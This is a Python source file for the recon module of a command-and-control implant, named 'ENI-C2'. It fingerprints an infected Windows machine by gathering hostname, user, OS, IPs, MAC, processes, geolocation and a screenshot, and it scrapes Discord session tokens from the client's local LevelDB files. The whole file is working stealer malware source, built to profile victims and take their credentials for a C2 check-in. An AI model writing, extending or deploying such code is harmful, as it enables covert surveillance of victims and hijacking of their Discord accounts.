"""
ENI-C2 Recon Module
Full environment fingerprinting for implant context.
"""

import os
import re
import sys
import json
import platform
import subprocess
import socket
import uuid
import io
from pathlib import Path
from typing import Dict, List, Optional

try:
    import requests
except ImportError:
    requests = None


class Recon:
    """Gather system intelligence for C2 checkin."""
    
    @staticmethod
    def hostname() -> str:
        return socket.gethostname()
    
    @staticmethod
    def username() -> str:
        return os.getenv("USERNAME") or os.getenv("USER") or "unknown"
    
    @staticmethod
    def os_info() -> Dict[str, str]:
        return {
            "system": platform.system(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
        }
    
    @staticmethod
    def public_ip() -> str:
        try:
            if requests:
                return requests.get("https://api.ipify.org", timeout=3).text
        except Exception:
            pass
        return "N/A"
    
    @staticmethod
    def local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "N/A"
    
    @staticmethod
    def mac_address() -> str:
        return ":".join(re.findall("..", "%012x" % uuid.getnode()))
    
    @staticmethod
    def running_processes() -> List[str]:
        try:
            output = subprocess.check_output(
                'tasklist /FO CSV /NH',
                shell=True,
                stderr=subprocess.DEVNULL
            ).decode(errors="ignore")
            return [line.split(",")[0].strip('"') for line in output.strip().split("\n")[:10]]
        except Exception:
            return []
    
    @staticmethod
    def discord_tokens() -> Dict[str, List[str]]:
        TOKEN_RE = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}")
        paths = {
            "Discord": os.path.join(os.getenv("APPDATA", ""), "discord"),
            "Canary": os.path.join(os.getenv("APPDATA", ""), "discordcanary"),
            "PTB": os.path.join(os.getenv("APPDATA", ""), "discordptb"),
        }
        found = {}
        for client, base in paths.items():
            leveldb = os.path.join(base, "Local Storage", "leveldb")
            if not os.path.exists(leveldb):
                continue
            tokens = set()
            for f in os.listdir(leveldb):
                if f.endswith((".ldb", ".log")):
                    try:
                        with open(os.path.join(leveldb, f), "r", errors="ignore") as fh:
                            tokens.update(TOKEN_RE.findall(fh.read()))
                    except (PermissionError, OSError):
                        pass
            if tokens:
                found[client] = list(tokens)[:3]
        return found
    
    @staticmethod
    def geolocation() -> Dict[str, str]:
        try:
            if requests:
                r = requests.get("http://ip-api.com/json/?fields=status,country,regionName,city,lat,lon,isp,org", timeout=3)
                if r.status_code == 200:
                    return r.json()
        except Exception:
            pass
        return {}
    
    @staticmethod
    def screenshot() -> Optional[bytes]:
        """Capture screenshot as PNG bytes."""
        try:
            from PIL import ImageGrab
            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, format="PNG")
            return buf.getvalue()
        except ImportError:
            # Pillow no está instalado
            return None
        except Exception:
            return None
    
    def full_profile(self) -> Dict:
        return {
            "hostname": self.hostname(),
            "username": self.username(),
            "os": self.os_info(),
            "public_ip": self.public_ip(),
            "local_ip": self.local_ip(),
            "mac": self.mac_address(),
            "processes": self.running_processes(),
            "discord_tokens": self.discord_tokens(),
            "geo": self.geolocation(),
            "pid": os.getpid(),
            "cwd": os.getcwd(),
        }